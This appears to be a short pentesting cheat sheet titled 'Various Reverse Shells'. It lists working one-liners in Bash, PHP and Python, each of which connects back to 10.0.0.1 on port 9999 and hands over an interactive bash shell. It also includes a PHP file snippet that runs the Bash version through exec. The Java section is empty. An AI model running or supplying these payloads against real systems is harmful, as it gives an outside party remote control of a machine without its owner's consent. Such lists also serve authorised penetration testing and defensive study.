# Various Reverse Shells

# Bash
```
bash -i >& /dev/tcp/10.0.0.1/9999 0>&1
```
###

# PHP
```
php -r '$sock=fsockopen("10.0.0.1",9999);exec("bash -i <&3 >&3 2>&3");'
```
##

```
<?php 

$cmd = 'echo "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1" | bash';
exec($cmd);

?>
```
###

# Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

```
###

# Java

###
